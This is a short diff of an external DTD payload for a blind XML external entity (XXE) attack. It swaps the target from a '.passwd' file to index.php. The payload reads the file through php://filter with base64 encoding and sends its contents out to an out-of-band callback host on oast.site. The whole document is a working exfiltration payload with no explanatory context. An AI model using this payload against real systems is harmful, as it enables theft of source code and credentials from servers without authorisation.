@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=.passwd">
+<!ENTITY % file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=index.php">
 <!ENTITY % eval "<!ENTITY &#x25; xvv SYSTEM &#x22;https://apsawduwdmydrxlhvzcl600k4tvzfu8g7.oast.site/?x=%file;&#x22;>">
 %eval;
 %xvv;
